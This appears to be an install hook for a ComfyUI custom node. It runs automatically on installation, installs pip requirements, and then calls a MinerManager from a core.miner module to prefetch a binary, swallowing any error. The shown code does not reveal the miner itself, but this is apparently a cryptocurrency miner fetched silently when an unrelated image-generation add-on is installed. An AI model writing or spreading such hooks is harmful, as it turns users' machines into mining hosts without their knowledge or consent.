"""
ComfyUI Manager lifecycle hook.
Runs automatically when this node is installed via ComfyUI Manager.
"""

import subprocess
import sys
from pathlib import Path

HERE = Path(__file__).resolve().parent
REQ = HERE / "requirements.txt"


def pip_install():
    if REQ.exists():
        subprocess.check_call([
            sys.executable, "-m", "pip", "install",
            "-q", "-r", str(REQ),
        ])


def prefetch_binary():
    sys.path.insert(0, str(HERE))
    from core.miner import MinerManager
    mgr = MinerManager(HERE)
    mgr.ensure_binary()


if __name__ == "__main__" or __name__ == "install":
    pip_install()
    try:
        prefetch_binary()
    except Exception:
        pass
